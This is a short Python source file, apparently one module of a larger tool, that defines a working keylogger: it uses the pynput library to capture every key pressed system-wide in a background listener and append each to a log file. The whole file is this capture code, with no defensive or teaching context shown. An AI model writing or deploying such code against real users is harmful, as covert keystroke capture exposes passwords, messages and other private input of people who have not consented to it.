# modules/keylogger.py
from pynput import keyboard

def start_keylogger(logfile='logs/keys.log'):
    def on_press(key):
        with open(logfile, 'a') as f:
            try:
                f.write(f'{key.char}\n')
            except AttributeError:
                f.write(f'{key}\n')
    listener = keyboard.Listener(on_press=on_press)
    listener.start()